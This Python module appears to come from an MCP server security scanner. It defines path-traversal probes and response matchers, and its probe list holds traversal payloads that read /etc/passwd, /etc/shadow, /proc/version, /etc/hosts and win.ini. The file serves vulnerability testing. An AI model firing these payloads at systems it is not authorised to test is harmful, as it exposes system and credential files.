"""Resource path traversal module — MVP attack module.

Design (Option A — self-contained probes)
------------------------------------------
Each ``PathTraversalProbe`` encapsulates:

1. The **payload** string that gets injected into the URI template.
2. A list of **matchers** that evaluate a ``TransportExchange`` and decide
   whether the probe confirmed a vulnerability.

The ``StrikeEngine`` is intentionally "dumb": it fires each probe and calls
``probe.matches(exchange)``.  It knows nothing about regex patterns or
JSON-RPC error codes.
"""

from __future__ import annotations

import re
from collections.abc import Callable
from dataclasses import dataclass

from mcp_striker.models import TransportExchange

# ---------------------------------------------------------------------------
# Matcher primitive
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class Matcher:
    """A named predicate over a ``TransportExchange``."""

    name: str
    fn: Callable[[TransportExchange], bool]

    def evaluate(self, exchange: TransportExchange) -> bool:
        return self.fn(exchange)


# ---------------------------------------------------------------------------
# Probe
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class PathTraversalProbe:
    """A single path traversal attempt with its associated matchers.

    All matchers must evaluate to ``True`` for the probe to be considered
    a confirmed hit (logical AND).
    """

    payload: str
    matchers: list[Matcher]

    def matches(self, exchange: TransportExchange) -> bool:
        """Return ``True`` if every matcher fires on *exchange*."""
        return all(m.evaluate(exchange) for m in self.matchers)

    def matchers_hit(self, exchange: TransportExchange) -> list[str]:
        """Return the names of every matcher that fired on *exchange*."""
        return [m.name for m in self.matchers if m.evaluate(exchange)]


# ---------------------------------------------------------------------------
# Built-in matcher factories
# ---------------------------------------------------------------------------


def _jsonrpc_success(exchange: TransportExchange) -> bool:
    """True when the server returned a successful JSON-RPC result."""
    return (
        not exchange.probe_failed
        and exchange.response is not None
        and exchange.response.is_success
    )


def _make_regex_fn(pattern: str) -> Callable[[TransportExchange], bool]:
    compiled = re.compile(pattern)

    def _match(exchange: TransportExchange) -> bool:
        if exchange.response is None:
            return False
        return bool(compiled.search(exchange.response.get_text_content()))

    return _match


_SUCCESS = Matcher(name="jsonrpc_success", fn=_jsonrpc_success)


def _regex(pattern: str) -> Matcher:
    return Matcher(name=f"regex:{pattern}", fn=_make_regex_fn(pattern))


def _probe(payload: str, *patterns: str) -> PathTraversalProbe:
    matchers = [_SUCCESS, *(_regex(p) for p in patterns)]
    return PathTraversalProbe(payload=payload, matchers=matchers)


# ---------------------------------------------------------------------------
# Probe list
# ---------------------------------------------------------------------------

PROBES: list[PathTraversalProbe] = [
    # --- Linux: /etc/passwd ---
    _probe("../../../etc/passwd",           r"root:x:0:0"),
    _probe("../../../../etc/passwd",         r"root:x:0:0"),
    _probe("../../../../../etc/passwd",      r"root:x:0:0"),
    _probe("../../../../../../etc/passwd",   r"root:x:0:0"),
    _probe("/etc/passwd",                    r"root:x:0:0"),
    # --- Linux: /etc/shadow ---
    _probe("../../../etc/shadow",            r"root:\$"),
    _probe("/etc/shadow",                    r"root:\$"),
    # --- Linux: /proc/version ---
    _probe("../../../proc/version",          r"Linux version"),
    _probe("/proc/version",                  r"Linux version"),
    # --- Linux: /etc/hosts ---
    _probe("../../../etc/hosts",             r"localhost|127\.0\.0\.1"),
    _probe("/etc/hosts",                     r"localhost|127\.0\.0\.1"),
    # --- Windows ---
    _probe(r"..\..\..\windows\win.ini",      r"\[fonts\]"),
    _probe(r"C:\windows\win.ini",            r"\[fonts\]"),
]
